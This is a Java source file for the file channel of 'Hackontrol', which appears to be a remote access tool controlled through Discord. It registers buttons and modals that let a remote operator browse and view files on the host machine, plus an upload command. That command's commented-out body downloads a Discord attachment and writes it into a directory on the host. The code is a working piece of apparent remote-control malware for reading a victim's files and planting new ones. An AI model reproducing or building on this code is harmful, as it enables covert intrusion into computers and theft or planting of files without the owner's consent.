package com.khopan.hackontrol.channel.file;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.manager.command.CommandContext;
import com.khopan.hackontrol.manager.command.CommandManager;
import com.khopan.hackontrol.manager.modal.ModalManager;
import com.khopan.hackontrol.registry.Registry;

import net.dv8tion.jda.api.interactions.commands.OptionType;
import net.dv8tion.jda.api.interactions.commands.build.Commands;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;

public class FileChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "file";

	private static final String BUTTON_QUERY_FILE = "queryFile";

	static final String MODAL_VIEW = "view";
	static final String MODAL_GO_INTO = "goInto";

	private FileBrowser browser;

	@Override
	public String getName() {
		return FileChannel.CHANNEL_NAME;
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(ButtonManager.staticButton(ButtonStyle.SUCCESS, "Query File", FileChannel.BUTTON_QUERY_FILE))).queue();
	}

	@Override
	public void register(Registry registry) {
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, FileChannel.BUTTON_QUERY_FILE, context -> this.browser = FileBrowser.start(context));
		registry.register(ModalManager.MODAL_REGISTRY, FileChannel.MODAL_VIEW, context -> this.browser.modalView(context));
		registry.register(ModalManager.MODAL_REGISTRY, FileChannel.MODAL_GO_INTO, context -> this.browser.modalGoInto(context));
		registry.register(CommandManager.COMMAND_REGISTRY, Commands.slash("upload", "Upload a file")
				.addOption(OptionType.ATTACHMENT, "file", "File to upload", true), this :: uploadFileCommand);
	}

	private void uploadFileCommand(CommandContext context) {
		/*OptionMapping fileOption = context.getOption("file");

		if(fileOption == null) {
			HackontrolError.message(context.reply(), "File option is missing");
			return;
		}

		if(this.filePointer == null || !this.filePointer.exists()) {
			HackontrolError.message(context.reply(), "No target location");
			return;
		}

		if(!this.filePointer.isDirectory()) {
			HackontrolError.message(context.reply(), "Target location must be a directory");
			return;
		}

		Attachment attachment = fileOption.getAsAttachment();
		String fileName = attachment.getFileName();
		File file = new File(this.filePointer, fileName);
		HackontrolMessage.deletable(context.reply(), "`Upload to '" + file.getAbsolutePath() + "'`");

		try {
			InputStream inputStream = attachment.getProxy().download().get();
			byte[] data = inputStream.readAllBytes();
			inputStream.close();
			FileOutputStream outputStream = new FileOutputStream(file);
			outputStream.write(data);
			outputStream.close();
		} catch(Throwable Errors) {
			HackontrolError.throwable(context.message(), Errors);
			return;
		}*/
	}
}
